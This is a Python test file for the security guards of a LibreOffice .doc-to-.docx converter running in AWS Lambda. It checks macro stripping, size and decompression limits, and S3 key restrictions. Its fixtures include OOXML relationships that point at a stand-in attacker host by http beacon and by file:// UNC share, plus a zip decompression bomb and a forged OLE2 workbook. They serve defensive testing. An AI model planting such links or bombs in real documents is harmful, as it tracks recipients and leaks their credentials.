"""Tests for the LibreOffice converter Lambda handler.

soffice itself is stubbed: what is under test is the guard/cleanup logic
around it, which is where a mistake becomes a security problem. That the
pinned import filter is honoured by the real LibreOffice build cannot be
tested here at all — that ran inside the built container, and the recorded
result is in the Gate 1 section of
docs/superpowers/plans/2026-08-08-doc-conversion.md.

Every guard assertion names the message its own guard raises. Bare
`pytest.raises(ConverterError)` cannot tell which check fired, so a deleted
guard stays green as long as some later check trips on the same fixture.
"""

from __future__ import annotations

import builtins
import io
import json
import os
import signal
import subprocess
import zipfile

import boto3
import pytest
from docx import Document

from rmf_migrator.common.limits import MAX_DOC_BYTES, MAX_DOCX_BYTES
from rmf_migrator.converter_lambda import handler as converter_module
from rmf_migrator.converter_lambda.handler import (
    _TIMEOUT_SECONDS,
    ConverterError,
    _run_soffice,
    convert_bytes,
    handler,
)
from rmf_migrator.doc_convert.lambda_backend import LibreOfficeLambdaConverter
from tests.conftest import ole2_container

_BUCKET = "scratch-bucket"

# Since Task 1's amendment, "doc" means a real WordDocument directory entry —
# bare OLE2 magic no longer qualifies.
LEGACY_DOC = ole2_container("WordDocument", "1Table")

# The same entry appended to a workbook. The sniff accepts this (it is a
# routing filter over attacker-supplied structure, not a containment boundary),
# so it is the pinned `--infilter` that has to keep the BIFF parser out.
FORGED_WORKBOOK = ole2_container("Workbook", "WordDocument")

_CONTENT_TYPES = b"""<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
<Default Extension="xml" ContentType="application/xml"/>
<Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>
<Override PartName="/word/vbaProject.bin" ContentType="application/vnd.ms-office.vbaProject"/>
</Types>"""  # noqa: E501 — OPC content types are long; wrapping them would not match what Word writes

# The same manifest without the VBA override, so a package built from it needs
# no macro edit at all — the external-link test then turns entirely on the
# relationship pass.
_PLAIN_CONTENT_TYPES = b"""<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
<Default Extension="xml" ContentType="application/xml"/>
<Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>
<Override PartName="/word/styles.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.styles+xml"/>
</Types>"""  # noqa: E501 — same

_STYLES_XML = b'<w:styles xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"/>'

_PACKAGE_RELS = b"""<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/>
</Relationships>"""  # noqa: E501 — same

_DOCUMENT_RELS = b"""<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
<Relationship Id="rId1" Type="http://schemas.microsoft.com/office/2006/relationships/vbaProject" Target="vbaProject.bin"/>
</Relationships>"""  # noqa: E501 — same

_LINKED_DOCUMENT_RELS = b"""<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/styles" Target="styles.xml"/>
<Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="http://beacon.attacker.example/track.png" TargetMode="External"/>
<Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="file://///attacker.example/share/x.png" TargetMode="External"/>
<Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://public.cyber.mil/stigs/" TargetMode="External"/>
</Relationships>"""  # noqa: E501 — same

_DOCUMENT_XML = (
    b'<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">'
    b"<w:body><w:p><w:r><w:t>policy text</w:t></w:r></w:p></w:body></w:document>"
)


def _docx(*members: tuple[str, bytes]) -> bytes:
    """A real (if minimal) .docx archive.

    The output guards reject bytes that only carry the zip magic, so a stub
    return value has to be an archive the converter could actually hand to
    python-docx.
    """
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as archive:
        for name, payload in members:
            archive.writestr(name, payload)
    return buf.getvalue()


def _converted_docx() -> bytes:
    """A minimal package that still declares a Word main document part.

    guard_docx_bytes now requires that declaration in [Content_Types].xml —
    bare zip magic is no longer enough — so a stub missing it would fail every
    caller expecting a successful conversion, not just the ones testing that
    check specifically.
    """
    return _docx(
        ("[Content_Types].xml", _PLAIN_CONTENT_TYPES),
        ("word/document.xml", b"<w:document/>"),
    )


def _macro_bearing_docx() -> bytes:
    """A package that references its VBA part the way Word and LibreOffice do.

    The reference lives in three places: the part itself, an Override in
    [Content_Types].xml, and a Relationship in word/_rels/document.xml.rels.
    Dropping only the part leaves an OPC package whose relationship points at
    nothing, which python-docx refuses to open.
    """
    return _docx(
        ("[Content_Types].xml", _CONTENT_TYPES),
        ("_rels/.rels", _PACKAGE_RELS),
        ("word/document.xml", _DOCUMENT_XML),
        ("word/_rels/document.xml.rels", _DOCUMENT_RELS),
        ("word/vbaProject.bin", b"macro payload"),
    )


def _link_bearing_docx() -> bytes:
    """A package whose manifest names somebody else's server.

    This is what a .doc with one linked graphic converts into: the fetch the
    image controls denied *this* process reappears as an OPC relationship in
    the artifact the pipeline stores and re-exports. No VBA part, so it also
    pins that the sanitizer rewrites a package it would otherwise pass through.
    """
    return _docx(
        ("[Content_Types].xml", _PLAIN_CONTENT_TYPES),
        ("_rels/.rels", _PACKAGE_RELS),
        ("word/document.xml", _DOCUMENT_XML),
        ("word/styles.xml", _STYLES_XML),
        ("word/_rels/document.xml.rels", _LINKED_DOCUMENT_RELS),
    )


def _fake_soffice(output: bytes):
    def run(data: bytes, workdir: str) -> bytes:
        return output

    return run


# Above /proc/sys/kernel/pid_max's own ceiling (2^22 on 64-bit Linux), so no
# real process group can ever carry it. Belt and braces behind the autouse
# fixture below: if a future test slips past the monkeypatch on a Linux host,
# the signal it sends has nowhere to land.
_UNALLOCATABLE_PID = 1 << 30


class _FakeSoffice:
    """Stands in for the soffice child process.

    Records how it was spawned and how it was reaped, so the tests can assert
    on containment — piped diagnostics, its own session, a bounded wait, a
    process-group kill — rather than on argv alone.
    """

    def __init__(self, *, on_run=None, returncode: int = 0, times_out: bool = False) -> None:
        self.argv: list[str] = []
        self.kwargs: dict = {}
        self.pid = _UNALLOCATABLE_PID
        self.returncode = returncode
        self.communicate_timeout: float | None = None
        self.killed = False
        self.waited = False
        self._on_run = on_run
        self._times_out = times_out

    def __call__(self, argv, **kwargs):
        self.argv = argv
        self.kwargs = kwargs
        return self

    def communicate(self, timeout=None):
        self.communicate_timeout = timeout
        if self._times_out:
            raise subprocess.TimeoutExpired(self.argv, timeout)
        if self._on_run is not None:
            self._on_run()
        return b"", b"secret policy text"

    def kill(self):
        self.killed = True

    def wait(self, timeout=None):
        self.waited = True
        return self.returncode


def test_convert_bytes_returns_soffice_output():
    docx = _converted_docx()
    assert convert_bytes(LEGACY_DOC, run=_fake_soffice(docx)) == docx


def test_convert_bytes_rejects_input_that_is_not_ole2():
    with pytest.raises(ConverterError, match="input is not a legacy binary"):
        convert_bytes(b"PK\x03\x04already a docx", run=_fake_soffice(_converted_docx()))


def test_convert_bytes_rejects_ole2_that_is_not_a_word_document():
    # An Excel workbook carries the same signature and would otherwise reach
    # LibreOffice's BIFF import filter — a parser outside the accepted risk.
    with pytest.raises(ConverterError, match="input is not a legacy binary"):
        convert_bytes(ole2_container("Workbook"), run=_fake_soffice(_converted_docx()))


def test_convert_bytes_rejects_oversized_input():
    with pytest.raises(ConverterError, match="input exceeds"):
        convert_bytes(LEGACY_DOC + b"x" * MAX_DOC_BYTES, run=_fake_soffice(_converted_docx()))


def test_convert_bytes_rejects_oversized_output():
    oversized = b"PK\x03\x04" + b"x" * MAX_DOCX_BYTES
    with pytest.raises(ConverterError, match="output exceeds"):
        convert_bytes(LEGACY_DOC, run=_fake_soffice(oversized))


def test_convert_bytes_rejects_output_that_is_not_a_docx():
    with pytest.raises(ConverterError, match="output is not a .docx"):
        convert_bytes(LEGACY_DOC, run=_fake_soffice(b"%PDF-1.7"))


def test_convert_bytes_rejects_output_that_decompresses_past_the_ceiling(monkeypatch):
    """The 25 MB output ceiling is compressed bytes; this is the other one.

    `_sanitize_output` decompresses every member into memory to rebuild the
    archive, so an output that is small on disk and enormous once expanded is
    absorbed in full before anything downstream sees it. A .doc whose structure
    expands heavily into OOXML is a plausible way to drive soffice into
    producing one, so the ceiling belongs here rather than only in the parse
    worker.

    The ordering is the property, not the raised error: guarding the sanitized
    bytes instead of the input still raises, because the rebuilt archive is
    over the ratio too — it just raises after the allocation this exists to
    prevent. So the sanitizer is replaced by something that cannot run.
    """
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as archive:
        archive.writestr("word/document.xml", b"<w:document/>")
        # Compresses ~1000:1, so the archive stays far inside MAX_DOCX_BYTES
        # while the ratio ceiling (200x) is crossed during decompression.
        archive.writestr("word/media/pad.bin", b"\x00" * (20 * 1024 * 1024))
        # Without a VBA part `_sanitize_output` rewrites nothing and never
        # decompresses anything; the macro is what opens the expensive path.
        archive.writestr("word/vbaProject.bin", b"macro payload")
    bomb = buf.getvalue()

    def refuse_to_run(_data: bytes) -> bytes:
        raise AssertionError("the decompression ceiling must bind before sanitization")

    monkeypatch.setattr(converter_module, "_sanitize_output", refuse_to_run)

    with pytest.raises(ConverterError, match="decompresses past"):
        convert_bytes(LEGACY_DOC, run=_fake_soffice(bomb))


def test_convert_bytes_rejects_output_that_is_not_a_readable_archive():
    # The format sniff reads four magic bytes, so a truncated or corrupt
    # archive passes it; the parse worker is the next thing to open this.
    with pytest.raises(ConverterError, match="not a readable .docx archive"):
        convert_bytes(LEGACY_DOC, run=_fake_soffice(b"PK\x03\x04not really a zip"))


def test_convert_bytes_strips_a_macro_project_from_the_output():
    result = convert_bytes(LEGACY_DOC, run=_fake_soffice(_macro_bearing_docx()))

    with zipfile.ZipFile(io.BytesIO(result)) as archive:
        assert "word/vbaProject.bin" not in archive.namelist()
        assert "word/document.xml" in archive.namelist()


def test_convert_bytes_leaves_a_readable_package_after_stripping_macros():
    """Dropping the part is only half the job; the references have to go too.

    A leftover Override or Relationship pointing at the removed part makes
    python-docx raise KeyError when it loads the package — and that lands in
    the parse worker, which records failure_stage="parse" for a document this
    function corrupted.
    """
    result = convert_bytes(LEGACY_DOC, run=_fake_soffice(_macro_bearing_docx()))

    document = Document(io.BytesIO(result))

    assert [paragraph.text for paragraph in document.paragraphs] == ["policy text"]


def test_convert_bytes_drops_external_resource_links_from_the_output():
    """Denying LibreOffice the fetch does not delete the URL from the artifact.

    A .doc carrying one linked graphic converts into a package whose manifest
    still names the attacker's server, and that package is what the pipeline
    stores at `converted_s3_key`, parses, and re-exports as the Rev 5 document
    a reviewer opens in Word. The fetch does not stop happening; it moves to
    their workstation, inside the CUI boundary, and a `file:` UNC target takes
    their NTLM credentials with it.
    """
    result = convert_bytes(LEGACY_DOC, run=_fake_soffice(_link_bearing_docx()))

    with zipfile.ZipFile(io.BytesIO(result)) as archive:
        rels = archive.read("word/_rels/document.xml.rels")

    assert b"beacon.attacker.example" not in rels
    assert b"attacker.example/share" not in rels


def test_convert_bytes_keeps_internal_and_clickable_relationships():
    """The strip has to stay narrow enough to leave a working document.

    Internal targets are the package's own parts — removing them corrupts it.
    A hyperlink is the one external relationship nothing resolves until a human
    decides to follow it, with the URL in front of them; policy documents cite
    public sources, and dropping those citations buys nothing.
    """
    result = convert_bytes(LEGACY_DOC, run=_fake_soffice(_link_bearing_docx()))

    with zipfile.ZipFile(io.BytesIO(result)) as archive:
        rels = archive.read("word/_rels/document.xml.rels")

    assert b'Target="styles.xml"' in rels
    assert b"https://public.cyber.mil/stigs/" in rels
    # Still a package python-docx can open: the parse worker reads this next.
    Document(io.BytesIO(result))


def test_convert_bytes_admits_a_forged_word_entry_on_a_workbook():
    """Pins the sniff's actual reach, so the next reader does not overtrust it.

    A `WordDocument` entry appended to an .xls satisfies `sniff_document_format`
    — the guard is structural, and the structure is attacker-supplied. This
    passing is not a defect; it is why the filter has to be pinned in argv.
    """
    docx = _converted_docx()
    assert convert_bytes(FORGED_WORKBOOK, run=_fake_soffice(docx)) == docx


def test_run_soffice_pins_the_word_import_filter(tmp_path, monkeypatch):
    """The import filter must come from argv, not from the bytes.

    Without `--infilter`, soffice chooses a filter by content, so
    FORGED_WORKBOOK would be parsed by the BIFF filter — a parser outside the
    accepted risk. This test pins the flag; the container run recorded under
    Gate 1 is what shows LibreOffice 7.4.7.2 honours it — without the flag the
    same forged workbook renders through BIFF, with it soffice writes nothing.
    """
    process = _FakeSoffice(on_run=lambda: (tmp_path / "input.docx").write_bytes(_converted_docx()))
    monkeypatch.setattr(subprocess, "Popen", process)

    _run_soffice(LEGACY_DOC, str(tmp_path))

    assert "--infilter=MS Word 97" in process.argv


def test_run_soffice_pipes_diagnostics_and_bounds_the_child(tmp_path, monkeypatch):
    """soffice writes parts of the document into its diagnostics.

    Unpiped, those go to the Lambda's own stdout/stderr and land in CloudWatch
    Logs — CUI in a log group nobody reads as a document store. The bounded
    wait and the separate session are the other half: an unbounded convert
    would be truncated by the function timeout instead of reported, and a
    child in our own session cannot be killed as a group.
    """
    process = _FakeSoffice(on_run=lambda: (tmp_path / "input.docx").write_bytes(_converted_docx()))
    monkeypatch.setattr(subprocess, "Popen", process)

    _run_soffice(LEGACY_DOC, str(tmp_path))

    assert process.kwargs["stdout"] is subprocess.PIPE
    assert process.kwargs["stderr"] is subprocess.PIPE
    assert process.kwargs["start_new_session"] is True
    assert process.communicate_timeout == _TIMEOUT_SECONDS


def test_run_soffice_reports_failure_without_echoing_the_document(tmp_path, monkeypatch):
    """A nonzero exit is a failure even though soffice wrote a file."""
    process = _FakeSoffice(
        returncode=1,
        on_run=lambda: (tmp_path / "input.docx").write_bytes(_converted_docx()),
    )
    monkeypatch.setattr(subprocess, "Popen", process)

    with pytest.raises(ConverterError, match="conversion process failed") as caught:
        _run_soffice(LEGACY_DOC, str(tmp_path))

    assert "secret policy text" not in str(caught.value)


def test_run_soffice_reports_a_refused_filter_as_no_output(tmp_path, monkeypatch):
    """How a refused `--infilter` presents: exit 0, nothing written.

    This `exists()` check — not the exit status — is what turns the Gate 1
    containment result into a ConverterError, so it is the enforcement point
    for the whole pinned-filter control.
    """
    process = _FakeSoffice(returncode=0)
    monkeypatch.setattr(subprocess, "Popen", process)

    with pytest.raises(ConverterError, match="conversion produced no output"):
        _run_soffice(LEGACY_DOC, str(tmp_path))


@pytest.fixture(autouse=True)
def killpg_calls(monkeypatch) -> list[tuple[int, int]]:
    """Intercept the process-group kill for every test in this module.

    Autouse, not opt-in: the reclaim lives in a `finally`, so every path
    through `_run_soffice` reaches it, including the ones whose assertions are
    about something else entirely. Patched only where it was asserted on, the
    remaining tests called the real `os.killpg(pid, SIGKILL)` — a no-op on the
    Windows dev hosts, where the module has no `killpg` at all and the
    AttributeError branch swallows it, but a live SIGKILL at whatever occupies
    that process group on the Linux CI runner, sent as the runner's own user.
    Measured: four calls escaped before this fixture existed.

    `raising=False` because Windows has no `os.killpg` to replace.
    """
    signalled: list[tuple[int, int]] = []
    monkeypatch.setattr(
        os, "killpg", lambda pgid, sig: signalled.append((pgid, sig)), raising=False
    )
    return signalled


# SIGKILL on the image's platform; the unit suite also runs on Windows, which
# has no such signal, so the expectation is resolved the same way the code is.
_EXPECTED_SIGNAL = getattr(signal, "SIGKILL", signal.SIGTERM)


def test_run_soffice_kills_the_whole_process_group_on_timeout(tmp_path, monkeypatch, killpg_calls):
    """/usr/bin/soffice execs oosplash, which forks soffice.bin beside it.

    Killing only the direct child leaves the parser resident, holding the
    decoded document, and Lambda freezes that orphan with the sandbox and
    thaws it into the next invocation.
    """
    process = _FakeSoffice(times_out=True)
    monkeypatch.setattr(subprocess, "Popen", process)

    with pytest.raises(ConverterError, match="conversion timed out"):
        _run_soffice(LEGACY_DOC, str(tmp_path))

    assert killpg_calls == [(process.pid, _EXPECTED_SIGNAL)]
    assert process.waited


def test_run_soffice_reclaims_the_process_group_when_the_filter_is_refused(
    tmp_path, monkeypatch, killpg_calls
):
    """The orphan argument is not specific to timeouts.

    A refused `--infilter` is the adversarial case this function is designed
    around, and it presents as exit 0 with nothing written — a path that
    raises without ever reaching the timeout handler. If the group is only
    reclaimed on timeout, the soffice.bin that just parsed a forged container
    is exactly the one left resident in the warm sandbox.
    """
    process = _FakeSoffice(returncode=0)
    monkeypatch.setattr(subprocess, "Popen", process)

    with pytest.raises(ConverterError, match="conversion produced no output"):
        _run_soffice(LEGACY_DOC, str(tmp_path))

    assert killpg_calls == [(process.pid, _EXPECTED_SIGNAL)]


def test_run_soffice_reclaims_the_process_group_after_a_successful_convert(
    tmp_path, monkeypatch, killpg_calls
):
    process = _FakeSoffice(on_run=lambda: (tmp_path / "input.docx").write_bytes(_converted_docx()))
    monkeypatch.setattr(subprocess, "Popen", process)

    _run_soffice(LEGACY_DOC, str(tmp_path))

    assert killpg_calls == [(process.pid, _EXPECTED_SIGNAL)]


def test_run_soffice_refuses_an_oversized_produced_file_without_reading_it(tmp_path, monkeypatch):
    """The ceiling has to bind before the allocation it exists to prevent.

    soffice writes into /tmp, which Lambda gives 512 MB of, so an input that
    drives a large conversion output (a rasterized metafile is the classic
    case) would otherwise be read into memory in full and only then measured.

    "Without reading it" is the whole property, so it is asserted directly:
    every `open` for the duration of the call is recorded, and the produced
    file must not appear among them. Raising is not enough — replacing the
    `getsize` check with a read followed by a length test raises the same
    error, from the far side of the allocation.
    """
    produced = tmp_path / "input.docx"
    process = _FakeSoffice(on_run=lambda: produced.write_bytes(b"x" * (MAX_DOCX_BYTES + 1)))
    monkeypatch.setattr(subprocess, "Popen", process)

    opened: list[str] = []
    real_open = builtins.open

    def recording_open(file, *args, **kwargs):
        # `on_run` writes through pathlib, which holds its own reference to
        # io.open, so only the handler's own opens land here.
        opened.append(str(file))
        return real_open(file, *args, **kwargs)

    monkeypatch.setattr(builtins, "open", recording_open)

    # `_run_soffice` itself, not `convert_bytes`: the point of the assertion is
    # that the refusal happens on this side of the read, so moving the check
    # back out to the caller has to fail here.
    with pytest.raises(ConverterError, match="output exceeds"):
        _run_soffice(LEGACY_DOC, str(tmp_path))

    assert str(produced) not in opened
    # The source write is the one open this path is allowed to make; asserting
    # it happened keeps the check above from passing because nothing ran.
    assert str(tmp_path / "input.doc") in opened


@pytest.fixture
def converter_bucket(aws, monkeypatch):
    s3 = boto3.client("s3", region_name="us-east-1")
    s3.create_bucket(Bucket=_BUCKET)
    monkeypatch.setenv("KMS_KEY_ID", "alias/test-key")
    monkeypatch.setenv("DOCUMENTS_BUCKET", _BUCKET)
    monkeypatch.setenv("AWS_DEFAULT_REGION", "us-east-1")
    return s3


def test_handler_writes_the_converted_docx_under_the_cmk(converter_bucket, monkeypatch):
    docx = _converted_docx()
    monkeypatch.setattr("rmf_migrator.converter_lambda.handler.convert_bytes", lambda data: docx)
    converter_bucket.put_object(
        Bucket="scratch-bucket", Key="convert-scratch/t.doc", Body=LEGACY_DOC
    )

    handler(
        {
            "bucket": "scratch-bucket",
            "source_key": "convert-scratch/t.doc",
            "target_key": "convert-scratch/t.docx",
        }
    )

    written = converter_bucket.get_object(Bucket="scratch-bucket", Key="convert-scratch/t.docx")
    assert written["Body"].read() == docx
    assert written["ServerSideEncryption"] == "aws:kms"
    # The customer-managed key is the control for CUI at rest; the AWS-managed
    # key would satisfy the line above and fail the requirement.
    assert written["SSEKMSKeyId"] == "alias/test-key"


def test_handler_reads_the_source_object_under_a_bound(converter_bucket, monkeypatch):
    """The read itself is the guard, not the length check that follows it.

    `convert_bytes` measures what it was handed, which is after the whole
    object has already been pulled into a 2 GB function's memory. Whatever is
    at the source key is only bounded by what this read asks for.
    """
    captured: list[bytes] = []

    def capture(data: bytes) -> bytes:
        captured.append(data)
        return convert_bytes(data)

    monkeypatch.setattr("rmf_migrator.converter_lambda.handler.convert_bytes", capture)
    converter_bucket.put_object(
        Bucket=_BUCKET,
        Key="convert-scratch/t.doc",
        Body=LEGACY_DOC + b"x" * MAX_DOC_BYTES,
    )

    with pytest.raises(ConverterError, match="input exceeds"):
        handler(
            {
                "bucket": _BUCKET,
                "source_key": "convert-scratch/t.doc",
                "target_key": "convert-scratch/t.docx",
            }
        )

    # One byte past the ceiling: enough to prove the object is oversized,
    # short of the object itself. An unbounded read would hand over all of it.
    assert len(captured[0]) == MAX_DOC_BYTES + 1


def test_handler_refuses_a_bucket_other_than_the_configured_one(converter_bucket, monkeypatch):
    """The key check pins only half of the (bucket, key) pair.

    Taking the bucket from the same untrusted event lets whoever can shape the
    payload choose which bucket is read and which one receives the converted
    CUI — correctly encrypted under this function's CMK and typed as a .docx.
    """
    monkeypatch.setattr(
        "rmf_migrator.converter_lambda.handler.convert_bytes", lambda data: _converted_docx()
    )
    converter_bucket.put_object(Bucket=_BUCKET, Key="convert-scratch/t.doc", Body=LEGACY_DOC)
    converter_bucket.create_bucket(Bucket="somewhere-else")

    with pytest.raises(ConverterError, match="bucket") as caught:
        handler(
            {
                "bucket": "somewhere-else",
                "source_key": "convert-scratch/t.doc",
                "target_key": "convert-scratch/t.docx",
            }
        )

    # Same no-echo style as the key check: the name came from the caller.
    assert "somewhere-else" not in str(caught.value)
    for bucket in (_BUCKET, "somewhere-else"):
        listed = converter_bucket.list_objects_v2(Bucket=bucket)
        written = [item["Key"] for item in listed.get("Contents", [])]
        assert written in ([], ["convert-scratch/t.doc"])
        assert "convert-scratch/t.docx" not in written


def test_the_callers_scratch_keys_satisfy_the_handlers_guard(converter_bucket, monkeypatch):
    """Pins the two ends of the scratch prefix to each other.

    `LibreOfficeLambdaConverter` builds the keys and the handler refuses
    anything outside the prefix, and nothing else crosses that seam. Renaming
    the prefix on one side breaks every conversion, and the breakage presents
    as "refusing a key outside the scratch prefix" — which reads as an attack
    rather than as a rename.
    """
    docx = _converted_docx()
    monkeypatch.setattr("rmf_migrator.converter_lambda.handler.convert_bytes", lambda data: docx)

    class _Store:
        def put_bytes(self, key: str, data: bytes, content_type: str) -> None:
            converter_bucket.put_object(Bucket=_BUCKET, Key=key, Body=data)

        def get_bytes(self, key: str, max_bytes: int) -> bytes:
            return converter_bucket.get_object(Bucket=_BUCKET, Key=key)["Body"].read()

        def delete_prefix(self, prefix: str) -> None:
            pass

    class _Lambda:
        """Invokes the real handler with the real payload, in-process."""

        def invoke(self, *, FunctionName: str, InvocationType: str, Payload: bytes) -> dict:  # noqa: N803 — boto3's parameter names
            handler(json.loads(Payload))
            return {"StatusCode": 200}

    converter = LibreOfficeLambdaConverter(
        function_name="rmf-doc-converter",
        bucket=_BUCKET,
        store=_Store(),
        lambda_client=_Lambda(),
    )

    assert converter.convert(LEGACY_DOC) == docx


def test_handler_leaves_no_target_object_when_conversion_fails(converter_bucket, monkeypatch):
    """The caller reads FunctionError; a half-written target would be read as success."""

    def refuse(data: bytes) -> bytes:
        raise ConverterError("conversion process failed")

    monkeypatch.setattr("rmf_migrator.converter_lambda.handler.convert_bytes", refuse)
    converter_bucket.put_object(
        Bucket="scratch-bucket", Key="convert-scratch/t.doc", Body=LEGACY_DOC
    )

    with pytest.raises(ConverterError):
        handler(
            {
                "bucket": "scratch-bucket",
                "source_key": "convert-scratch/t.doc",
                "target_key": "convert-scratch/t.docx",
            }
        )

    listed = converter_bucket.list_objects_v2(Bucket="scratch-bucket", Prefix="convert-scratch/")
    assert [item["Key"] for item in listed.get("Contents", [])] == ["convert-scratch/t.doc"]


def test_handler_refuses_keys_outside_the_scratch_prefix(converter_bucket, monkeypatch):
    """Otherwise the function is a write primitive for anything that can invoke it.

    Its caller only ever names `convert-scratch/{uuid}` keys
    (doc_convert/lambda_backend.py), but nothing on this side made that a rule:
    a target of `projects/{id}/exports/...` would overwrite the Rev 5 export a
    human downloads and signs, correctly encrypted and typed.
    """
    monkeypatch.setattr(
        "rmf_migrator.converter_lambda.handler.convert_bytes", lambda data: _converted_docx()
    )
    converter_bucket.put_object(
        Bucket="scratch-bucket", Key="convert-scratch/t.doc", Body=LEGACY_DOC
    )
    export_key = "projects/p1/exports/d1-rev5.docx"

    with pytest.raises(ConverterError, match="outside the scratch prefix") as caught:
        handler(
            {
                "bucket": "scratch-bucket",
                "source_key": "convert-scratch/t.doc",
                "target_key": export_key,
            }
        )

    # The key can carry a document name, so the refusal never repeats it.
    assert export_key not in str(caught.value)
    with pytest.raises(ConverterError, match="outside the scratch prefix"):
        handler(
            {
                "bucket": "scratch-bucket",
                "source_key": "projects/p1/documents/d1.docx",
                "target_key": "convert-scratch/t.docx",
            }
        )

    # The trailing slash on CONVERT_SCRATCH_PREFIX is what makes this a prefix
    # rather than a name fragment (common/limits.py). Dropping it from the
    # constant is caught in test_doc_convert.py; dropping it on this side —
    # `CONVERT_SCRATCH_PREFIX.rstrip("/")` — was caught by nothing, and widens
    # the guard to every sibling prefix an attacker can name.
    for source_key, target_key in (
        ("convert-scratch/t.doc", "convert-scratch-evil/t.docx"),
        ("convert-scratch-evil/t.doc", "convert-scratch/t.docx"),
    ):
        with pytest.raises(ConverterError, match="outside the scratch prefix"):
            handler(
                {
                    "bucket": "scratch-bucket",
                    "source_key": source_key,
                    "target_key": target_key,
                }
            )

    listed = converter_bucket.list_objects_v2(Bucket="scratch-bucket")
    assert [item["Key"] for item in listed.get("Contents", [])] == ["convert-scratch/t.doc"]


def test_handler_refuses_a_target_that_overwrites_its_own_source(converter_bucket, monkeypatch):
    monkeypatch.setattr(
        "rmf_migrator.converter_lambda.handler.convert_bytes", lambda data: _converted_docx()
    )
    converter_bucket.put_object(
        Bucket="scratch-bucket", Key="convert-scratch/t.doc", Body=LEGACY_DOC
    )

    with pytest.raises(ConverterError, match="source and target must differ"):
        handler(
            {
                "bucket": "scratch-bucket",
                "source_key": "convert-scratch/t.doc",
                "target_key": "convert-scratch/t.doc",
            }
        )

    unchanged = converter_bucket.get_object(Bucket="scratch-bucket", Key="convert-scratch/t.doc")
    assert unchanged["Body"].read() == LEGACY_DOC
